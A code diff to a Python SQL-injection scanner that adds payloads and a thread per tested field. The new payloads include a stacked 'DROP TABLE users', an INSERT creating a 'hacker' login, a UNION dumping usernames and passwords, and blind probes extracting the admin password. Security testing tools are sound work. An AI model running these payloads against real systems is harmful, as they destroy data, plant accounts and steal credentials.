@@ -5,11 +5,13 @@ from typing import List, Dict, Optional
 import logging
 from urllib.parse import urljoin
 import time
+import threading
 
 class SQLInjectionScanner(BaseScanner):
     def __init__(self, target_url: str, config: Dict):
         super().__init__(target_url, config)
         self.payloads = [
+            # Classic Injection Payloads
             "' OR '1'='1",
             "' UNION SELECT '1",
             "1' OR '1'='1",
@@ -19,102 +21,129 @@ class SQLInjectionScanner(BaseScanner):
             "') OR ('1'='1",
             "' OR '1'='1'--",
             "' OR 1=1#",
-            "' OR EXISTS(SELECT 1)--"
+            "' OR EXISTS(SELECT 1)--",
+            
+            # Advanced Injection Payloads
+            "' UNION ALL SELECT 1, 2, 3--",
+            "' OR 1 IN (SELECT 1)--",
+            "' OR (SELECT 'x') = 'x'--",
+            "' AND (SELECT 'x') = 'x'--",
+            "' UNION SELECT username, password FROM users--",
+            
+            # Numeric Injections
+            "1 OR 1=1",
+            "1 AND 1=0",
+            
+            # Stacked Queries
+            "'; DROP TABLE users--",
+            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password')--",
+            
+            # Blind SQL Injection Techniques
+            "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'--",
+            "' AND (LENGTH(password) > 10)--"
         ]
         
         self.boolean_payloads = [
+            # Expanded Boolean-based Injection Payloads
             ("' AND '1'='1", "' AND '1'='2"), 
             ("' OR '1'='1", "' OR '1'='2"),   
-            ("1' OR '1'='1", "1' OR '1'='2")  
+            ("1' OR '1'='1", "1' OR '1'='2"),
+            ("1 AND 1=1", "1 AND 1=0"),
+            ("' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100--", 
+             "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) < 100--")
         ]
         
         self.time_payloads = [
+            # Time-based Blind SQL Injection Payloads
             "'; SELECT SLEEP(5)--",
             "'; WAITFOR DELAY '0:0:5'--",
             "' OR SLEEP(5)--",
-            "' AND SLEEP(5)--"
+            "' AND SLEEP(5)--",
+            "1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a', SLEEP(5), 0)--",
+            "1' AND (SELECT IF(SUBSTRING(password,1,1)='a', BENCHMARK(5000000,MD5('a')), 0) FROM users LIMIT 1)--"
         ]
 
     def scan(self) -> Dict:
         try:
-            results = []
+            tasks = []
             response = self.make_request(self.target_url)
             
             if not response:
                 return {'sql_injection': []}
 
+            # Prepare form-based tasks
             forms = RequestUtils.extract_forms(response.text)
             for form in forms:
                 form_url = urljoin(self.target_url, form['action'] or self.target_url)
                 for input_field in form['inputs']:
                     if input_field['type'] not in ['submit', 'button', 'image', 'file']:
-                        for payload in self.payloads:
-                            if self.test_injection(form_url, form['method'], input_field['name'], payload):
-                                results.append({
-                                    'url': form_url,
-                                    'method': form['method'],
-                                    'parameter': input_field['name'],
-                                    'payload': payload,
-                                    'type': 'Error-based SQL Injection',
-                                    'severity': 'High'
-                                })
-                                continue 
+                        tasks.append({
+                            'type': 'form',
+                            'url': form_url,
+                            'method': form['method'],
+                            'parameter': input_field['name']
+                        })
 
-                        for true_payload, false_payload in self.boolean_payloads:
-                            if self.test_boolean_injection(form_url, form['method'], input_field['name'], 
-                                                         true_payload, false_payload):
-                                results.append({
-                                    'url': form_url,
-                                    'method': form['method'],
-                                    'parameter': input_field['name'],
-                                    'payload': f"{true_payload} vs {false_payload}",
-                                    'type': 'Boolean-based SQL Injection',
-                                    'severity': 'High'
-                                })
-                                continue
-
-                        for payload in self.time_payloads:
-                            if self.test_time_based_injection(form_url, form['method'], 
-                                                            input_field['name'], payload):
-                                results.append({
-                                    'url': form_url,
-                                    'method': form['method'],
-                                    'parameter': input_field['name'],
-                                    'payload': payload,
-                                    'type': 'Time-based SQL Injection',
-                                    'severity': 'High'
-                                })
-
+            # Prepare URL parameter tasks
             query_params = self.extract_url_parameters(self.target_url)
             for param in query_params:
-                for payload in self.payloads:
-                    if self.test_injection(self.target_url, 'get', param, payload):
-                        results.append({
-                            'url': self.target_url,
-                            'method': 'get',
-                            'parameter': param,
-                            'payload': payload,
-                            'type': 'Error-based SQL Injection',
-                            'severity': 'High'
-                        })
+                tasks.append({
+                    'type': 'url',
+                    'url': self.target_url,
+                    'method': 'get',
+                    'parameter': param
+                })
 
-                for true_payload, false_payload in self.boolean_payloads:
-                    if self.test_boolean_injection(self.target_url, 'get', param, 
-                                                 true_payload, false_payload):
-                        results.append({
-                            'url': self.target_url,
-                            'method': 'get',
-                            'parameter': param,
-                            'payload': f"{true_payload} vs {false_payload}",
-                            'type': 'Boolean-based SQL Injection',
-                            'severity': 'High'
-                        })
-
+            # Run all tasks concurrently
+            results = self.run_concurrent_tasks(tasks)
             return {'sql_injection': results}
 
         except Exception as e:
             logging.error(f"SQL Injection scanner error: {e}")
             return {'sql_injection': [], 'error': str(e)}
+
+    def execute_task(self, task: Dict) -> Optional[Dict]:
+        results = []
+        
+        # Test error-based injection
+        for payload in self.payloads:
+            if self.test_injection(task['url'], task['method'], task['parameter'], payload):
+                return {
+                    'url': task['url'],
+                    'method': task['method'],
+                    'parameter': task['parameter'],
+                    'payload': payload,
+                    'type': 'Error-based SQL Injection',
+                    'severity': 'High'
+                }
+
+        # Test boolean-based injection
+        for true_payload, false_payload in self.boolean_payloads:
+            if self.test_boolean_injection(task['url'], task['method'], 
+                                         task['parameter'], true_payload, false_payload):
+                return {
+                    'url': task['url'],
+                    'method': task['method'],
+                    'parameter': task['parameter'],
+                    'payload': f"{true_payload} vs {false_payload}",
+                    'type': 'Boolean-based SQL Injection',
+                    'severity': 'High'
+                }
+
+        # Test time-based injection
+        for payload in self.time_payloads:
+            if self.test_time_based_injection(task['url'], task['method'], 
+                                            task['parameter'], payload):
+                return {
+                    'url': task['url'],
+                    'method': task['method'],
+                    'parameter': task['parameter'],
+                    'payload': payload,
+                    'type': 'Time-based SQL Injection',
+                    'severity': 'High'
+                }
+
+        return None
 
     def test_injection(self, url: str, method: str, param: str, payload: str) -> bool:
         try:
@@ -236,3 +265,22 @@ class SQLInjectionScanner(BaseScanner):
         except Exception as e:
             logging.error(f"Error extracting URL parameters: {e}")
             return []
+
+    def run_concurrent_tasks(self, tasks: List[Dict]) -> List[Dict]:
+        results = []
+        threads = []
+
+        def worker(task):
+            result = self.execute_task(task)
+            if result:
+                results.append(result)
+
+        for task in tasks:
+            thread = threading.Thread(target=worker, args=(task,))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+        return results
